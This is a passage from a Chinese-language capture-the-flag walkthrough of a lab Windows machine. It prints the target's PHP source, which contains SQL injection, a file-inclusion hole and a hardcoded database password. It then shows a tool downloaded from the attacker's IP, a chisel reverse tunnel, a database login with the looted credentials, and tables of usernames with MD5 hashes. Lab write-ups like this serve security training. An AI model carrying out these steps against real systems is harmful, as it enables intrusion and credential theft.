= sqlsrv_connect(<span class="hljs-string">&#x27;(local)&#x27;</span>,$connection);<br><span class="hljs-keyword">if</span> (!isset($_POST[<span class="hljs-string">&#x27;q&#x27;</span>]))<br>&#123;<br><br>        $query = <span class="hljs-string">&quot;select * from movies order by movie&quot;</span>;<br>        $res = sqlsrv_query($handle, $query, <span class="hljs-built_in">array</span>(), <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Scrollable&quot;</span>=&gt;<span class="hljs-string">&quot;buffered&quot;</span>));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>        $_SESSION[<span class="hljs-string">&#x27;no_of_reqs&#x27;</span>] +=<span class="hljs-number">1</span>;<br>        $query = <span class="hljs-string">&quot;select * from movies where movie like &#x27;%&quot;</span>.$_POST[<span class="hljs-string">&#x27;q&#x27;</span>].<span class="hljs-string">&quot;%&#x27; order by movie&quot;</span>;<br>        $res = sqlsrv_query($handle, $query, <span class="hljs-built_in">array</span>(), <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Scrollable&quot;</span>=&gt;<span class="hljs-string">&quot;buffered&quot;</span>));<br>&#125;<br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;title&gt;Streamio&lt;/title&gt;<br>        &lt;link rel = <span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;static/icon.png&quot;</span> type = <span class="hljs-string">&quot;image/x-icon&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;<br>        &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;static/css/bootstrap.css&quot;</span>&gt;<br>        &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;static/css/search.css&quot;</span>&gt;<br>        &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>                function unavailable() &#123;<br>                        alert(<span class="hljs-string">&quot;Movie Steaming is currently unavailable due to Some security issues&quot;</span>);<br>                &#125;<br>        &lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>        &lt;center&gt;<br>                &lt;img id=<span class="hljs-string">&quot;logo&quot;</span> src=<span class="hljs-string">&quot;static/logo.png&quot;</span>&gt;<br>        &lt;/center&gt;<br>        &lt;br&gt;&lt;br&gt;<br>        &lt;h3&gt;Search <span class="hljs-keyword">for</span> a movie:&lt;/h3&gt;<br>        &lt;form action=<span class="hljs-string">&quot;/search.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>                &lt;div class=<span class="hljs-string">&quot;input-group&quot;</span>&gt;<br>                        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;q&quot;</span> class=<span class="hljs-string">&quot;form-control&quot;</span> autofocus&gt;<br>                        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> class=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;Search&lt;/button&gt;<br>                &lt;/div&gt;<br>        &lt;/form&gt;<br>        &lt;br&gt;&lt;br&gt;<br>        &lt;div&gt;<br>                &lt;?php<br>                <span class="hljs-keyword">while</span>($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))<br>                &#123;<br>                        echo <span class="hljs-string">&#x27;&lt;div class=&quot;d-flex movie align-items-end&quot;&gt;</span><br><span class="hljs-string">                                &lt;div class=&quot;mr-auto p-2&quot;&gt;</span><br><span class="hljs-string">                                        &lt;h5 class=&quot;p-2&quot;&gt;&#x27;</span>.$row[<span class="hljs-string">&quot;movie&quot;</span>]<span class="hljs-number">.&#x27;</span>&lt;/h5&gt;<br>                                &lt;/div&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;ms-auto p-2&quot;</span>&gt;<br>                                        &lt;span class=<span class="hljs-string">&quot;&quot;</span>&gt;<span class="hljs-string">&#x27;.$row[&quot;year&quot;] .&#x27;</span>&lt;/span&gt;<br>                                        &lt;button class=<span class="hljs-string">&quot;btn btn-dark&quot;</span> onclick=<span class="hljs-string">&quot;unavailable();&quot;</span>&gt;Watch&lt;/button&gt;<br>                                &lt;/div&gt;<br>                        &lt;/div&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string">                ?&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">PS C:\inetpub\watch.streamio.htb&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">PS C:\inetpub\streamio.htb\admin&gt; ls</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    Directory: C:\inetpub\streamio.htb\admin</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="hljs-string">----                -------------         ------ ----                                                                  </span><br><span class="hljs-string">d-----        2/22/2022   2:49 AM                css                                                                   </span><br><span class="hljs-string">d-----        2/22/2022   2:49 AM                fonts                                                                 </span><br><span class="hljs-string">d-----        2/22/2022   2:49 AM                images                                                                </span><br><span class="hljs-string">d-----        2/22/2022   3:19 AM                js                                                                    </span><br><span class="hljs-string">-a----         6/3/2022   1:51 AM           2401 index.php                                                             </span><br><span class="hljs-string">-a----         6/3/2022   1:53 AM           3055 master.php                                                            </span><br><span class="hljs-string">-a----        2/23/2022   2:16 AM            878 movie_inc.php                                                         </span><br><span class="hljs-string">-a----        2/23/2022   2:16 AM            936 staff_inc.php                                                         </span><br><span class="hljs-string">-a----        2/23/2022   2:16 AM            879 user_inc.php                                                          </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">PS C:\inetpub\streamio.htb\admin&gt;</span><br><span class="hljs-string">PS C:\inetpub\streamio.htb\admin&gt; cat index.php</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">define(&#x27;</span>included<span class="hljs-number">&#x27;</span>,<span class="hljs-literal">true</span>);<br>session_start();<br><span class="hljs-keyword">if</span>(!isset($_SESSION[<span class="hljs-string">&#x27;admin&#x27;</span>]))<br>&#123;<br>        header(<span class="hljs-string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);<br>        die(<span class="hljs-string">&quot;&lt;h1&gt;FORBIDDEN&lt;/h1&gt;&quot;</span>);<br>&#125;<br>$connection = <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Database&quot;</span>=&gt;<span class="hljs-string">&quot;STREAMIO&quot;</span>, <span class="hljs-string">&quot;UID&quot;</span> =&gt; <span class="hljs-string">&quot;db_admin&quot;</span>, <span class="hljs-string">&quot;PWD&quot;</span> =&gt; <span class="hljs-string">&#x27;B1@hx31234567890&#x27;</span>);<br>$handle = sqlsrv_connect(<span class="hljs-string">&#x27;(local)&#x27;</span>,$connection);<br><br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;title&gt;Admin panel&lt;/title&gt;<br>        &lt;link rel = <span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;/images/icon.png&quot;</span> type = <span class="hljs-string">&quot;image/x-icon&quot;</span>&gt;<br>        &lt;!-- Basic --&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>        &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;<br>        &lt;!-- Mobile Metas --&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span> /&gt;<br>        &lt;!-- Site Metas --&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;keywords&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;author&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;<br><br>&lt;link href=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> integrity=<span class="hljs-string">&quot;sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;<br>&lt;script src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;<br><br>        &lt;!-- Custom styles <span class="hljs-keyword">for</span> this template --&gt;<br>        &lt;link href=<span class="hljs-string">&quot;/css/style.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;<br>        &lt;!-- responsive style --&gt;<br>        &lt;link href=<span class="hljs-string">&quot;/css/responsive.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;<br><br>&lt;/head&gt;<br>&lt;body&gt;<br>        &lt;center class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>                &lt;br&gt;<br>                &lt;h1&gt;Admin panel&lt;/h1&gt;<br>                &lt;br&gt;&lt;hr&gt;&lt;br&gt;<br>                &lt;ul class=<span class="hljs-string">&quot;nav nav-pills nav-fill&quot;</span>&gt;<br>                        &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                                &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;?user=&quot;</span>&gt;User management&lt;/a&gt;<br>                        &lt;/li&gt;<br>                        &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                                &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;?staff=&quot;</span>&gt;Staff management&lt;/a&gt;<br>                        &lt;/li&gt;<br>                        &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                                &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;?movie=&quot;</span>&gt;Movie management&lt;/a&gt;<br>                        &lt;/li&gt;<br>                        &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                                &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;?message=&quot;</span>&gt;Leave a message <span class="hljs-keyword">for</span> admin&lt;/a&gt;<br>                        &lt;/li&gt;<br>                &lt;/ul&gt;<br>                &lt;br&gt;&lt;hr&gt;&lt;br&gt;<br>                &lt;div id=<span class="hljs-string">&quot;inc&quot;</span>&gt;<br>                        &lt;?php<br>                                <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;debug&#x27;</span>]))<br>                                &#123;<br>                                        echo <span class="hljs-string">&#x27;this option is for developers only&#x27;</span>;<br>                                        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;debug&#x27;</span>] === <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                                                die(<span class="hljs-string">&#x27; ---- ERROR ----&#x27;</span>);<br>                                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                                                include $_GET[<span class="hljs-string">&#x27;debug&#x27;</span>];<br>                                        &#125;<br>                                &#125;<br>                                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]))<br>                                        require <span class="hljs-string">&#x27;user_inc.php&#x27;</span>;<br>                                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;staff&#x27;</span>]))<br>                                        require <span class="hljs-string">&#x27;staff_inc.php&#x27;</span>;<br>                                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;movie&#x27;</span>]))<br>                                        require <span class="hljs-string">&#x27;movie_inc.php&#x27;</span>;<br>                                <span class="hljs-keyword">else</span> <br>                        ?&gt;<br>                &lt;/div&gt;<br>        &lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>PS C:\inetpub\streamio.htb\admin&gt; <br></code></pre></td></tr></table></figure>

<p>22、这里的枚举中，发现了个数据库的账号密码，我这里想的是做一个简单的端口转发，然后我使用本地的工具，去登录数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Downloads&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.30:8080/chisel_1.9.1_windows_amd64 -o C:\Downloads\chisel_1.9.1_windows_amd64.exe</span><br>PS C:\Downloads&gt; ls<br><br><br>    Directory: C:\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">3</span>:<span class="hljs-number">57</span> PM        <span class="hljs-number">9006080</span> chisel_1<span class="hljs-number">.9</span><span class="hljs-number">.1</span>_windows_amd64.exe                                        <br><br><br>PS C:\Downloads&gt; ./chisel_1<span class="hljs-number">.9</span><span class="hljs-number">.1</span>_windows_amd64.exe client <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.30</span>:<span class="hljs-number">8000</span> R:<span class="hljs-number">1433</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1433</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools/chisel]<br>└─$ ./chisel_1<span class="hljs-number">.9</span><span class="hljs-number">.1</span>_linux_arm64 server -p <span class="hljs-number">8000</span> --reverse                   <br><span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span> <span class="hljs-number">07</span>:<span class="hljs-number">51</span>:<span class="hljs-number">16</span> server: Reverse tunnelling enabled<br><span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span> <span class="hljs-number">07</span>:<span class="hljs-number">51</span>:<span class="hljs-number">16</span> server: Fingerprint <span class="hljs-number">9</span>xrg8OCrxsTW8g0SixIuufOcSpiDRZtkZLu3jTsVtjE=<br><span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span> <span class="hljs-number">07</span>:<span class="hljs-number">51</span>:<span class="hljs-number">16</span> server: Listening on http:<span class="hljs-comment">//0.0.0.0:8000</span><br><span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span> <span class="hljs-number">07</span>:<span class="hljs-number">52</span>:<span class="hljs-number">40</span> server: session#<span class="hljs-number">1</span>: tun: proxy#R:<span class="hljs-number">1433</span>=&gt;<span class="hljs-number">1433</span>: Listening<br></code></pre></td></tr></table></figure>

<p>23、端口是转发出来了，然后我们使用mssqlclient工具进行连接和枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-mssqlclient db_admin:B1@hx31234567890@<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>              <br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span><br>[*] INFO(DC): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(DC): Line <span class="hljs-number">1</span>: Changed language setting to us_english.<br>[*] ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL <span class="hljs-title function_">Server</span> <span class="hljs-params">(<span class="hljs-number">150</span> <span class="hljs-number">7208</span>)</span> <br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@master)</span>&gt; <br><br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@master)</span>&gt; select name from sys.databases;<br>name              <br>---------------   <br>master            <br><br>tempdb            <br><br>model             <br><br>msdb              <br><br>STREAMIO          <br><br>streamio_backup   <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@master)</span>&gt; <br><br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@master)</span>&gt; select name from streamio_backup.dbo.sysobjects where xtype=<span class="hljs-string">&#x27;U&#x27;</span><br>name     <br>------   <br>movies   <br><br>users    <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@master)</span>&gt; select name from streamio_backup.dbo.syscolumns where name=<span class="hljs-string">&#x27;users&#x27;</span><br>name   <br>----   <br>SQL (db_admin  db_admin@master)&gt; select * from users;<br>id   username                                             password                                             is_staff   <br>--   --------------------------------------------------   --------------------------------------------------   --------   <br> <span class="hljs-number">3</span>   James                                                c660060492d9edcaa8332d89c99c9239                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">4</span>   Theodore                                             <span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">5</span>   Samantha                                             <span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">6</span>   Lauren                                               <span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">7</span>   William                                              d62be0dc82071bccc1322d64ec5b6c51                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">8</span>   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5                            <span class="hljs-number">1</span>   <br><br> <span class="hljs-number">9</span>   Robert                                               f03b910e2bd0313a23fdd7575f34a694                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">10</span>   Thane                                                <span class="hljs-number">3577</span>c47eb1e12c8ba021611e1280753c                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">11</span>   Carmon                                               <span class="hljs-number">35394484</span>d89fcfdb3c5e447fe749d213                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">12</span>   Barry                                                <span class="hljs-number">54</span>c88b2dbd7b1a84012fabc1a4c73415                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">13</span>   Oliver                                               fd78db29173a5cf701bd69027cb9bf6b                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">14</span>   Michelle                                             b83439b16f844bd6ffe35c02fe21b3c0                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">15</span>   Gloria                                               <span class="hljs-number">0</span>cfaaaafb559f081df2befbe66686de0                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">16</span>   Victoria                                             b22abb47a02b52d5dfa27fb0b534f693                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">17</span>   Alexendra                                            <span class="hljs-number">1</span>c2b3d8270321140e5153f6637d3ee53                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">18</span>   Baxter                                               <span class="hljs-number">22</span>ee218331afd081b0dcd8115284bae3                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">19</span>   Clara                                                ef8f3d30a856cf166fb8215aca93e9ff                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">20</span>   Barbra                                               <span class="hljs-number">3961548825e3</span>e21df5646cafe11c6c76                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">21</span>   Lenord                                               ee0b8a0937abd60c2882eacb2f8dc49f                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">22</span>   Austin                                               <span class="hljs-number">0049</span>ac57646627b8d7aeaccf8b6a936f                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">23</span>   Garfield                                             <span class="hljs-number">8097</span>cedd612cc37c29db152b6e9edbd3                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">24</span>   Juliette                                             <span class="hljs-number">6</span>dcd87740abb64edfa36d170f0d5450d                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">25</span>   Victor                                               bf55e15b119860a6e6b5a164377da719                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">26</span>   Lucifer                                              <span class="hljs-number">7</span>df45a9e3de3863807c026ba48e55fb3                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">27</span>   Bruno                                                <span class="hljs-number">2</span>a4e2cf22dd8fcb45adcb91be1e22ae8                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">28</span>   Diablo                                               ec33265e5fc8c2f1b0c137bb7b3632b5                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">29</span>   Robin                                                dc332fb5576e9631c9dae83f194f8e70                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">30</span>   Stan                                                 <span class="hljs-number">384463526</span>d288edcc95fc3701e523bc7                            <span class="hljs-number">1</span>   <br><br><span class="hljs-number">31</span>   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332                            <span class="hljs-number">1</span>   <br><br>SQL (db_admin  db_admin@master)&gt; <br><br><br>好像数据库不太对，得切换下<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-mssqlclient db_admin:B1@hx31234567890@<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -db streamio_backup<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: streamio_backup<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span><br>[*] INFO(DC): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&#x27;streamio_backup&#x27;</span>.<br>[*] INFO(DC): Line <span class="hljs-number">1</span>: Changed language setting to us_english.<br>[*] ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL <span class="hljs-title function_">Server</span> <span class="hljs-params">(<span class="hljs-number">150</span> <span class="hljs-number">7208</span>)</span> <br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@streamio_backup)</span>&gt; select * from streamio_backup.dbo.syscolumns where name=<span class="hljs-string">&#x27;users&#x27;</span><br>name   id   xtype   typestat   xusertype   length   xprec   xscale   colid   xoffset   bitpos   reserved   colstat   cdefault   domain   number   colorder   autoval   offset   collationid   language   status   type   usertype   printfmt   prec   scale   iscomputed   isoutparam   isnullable   collation   tdscollation   <br>----   --   -----   --------   ---------   ------   -----   ------   -----   -------   ------   --------   -------   --------   ------   ------   --------   -------   ------   -----------   --------   ------   ----   --------   --------   ----   -----   ----------   ----------   ----------   ---------   ------------   <br>SQL (db_admin  db_admin@streamio_backup)&gt; select * from users;<br>id   username                                             password                                             <br>--   --------------------------------------------------   --------------------------------------------------   <br> <span class="hljs-number">1</span>   nikk37                                               <span class="hljs-number">389</span>d14cb8e4e9b94b137deb1caf0612a                     <br><br> <span class="hljs-number">2</span>   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332                     <br><br> <span class="hljs-number">3</span>   James                                                c660060492d9edcaa8332d89c99c9239                     <br><br> <span class="hljs-number">4</span>   Theodore                                             <span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e                     <br><br> <span class="hljs-number">5</span>   Samantha                                             <span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d                     <br><br> <span class="hljs-number">6</span>   Lauren                                               <span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09                     <br><br> <span class="hljs-number">7</span>   William                                              d62be0dc82071bccc1322d64ec5b6c51                     <br><br> <span class="hljs-number">8</span>   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5                     <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(db_admin  db_admin@streamio_backup)</span>&gt; <br><br></code></pre></td></tr></table></figure>

<p>24、下面简单的列一下发现的密码信息</p>
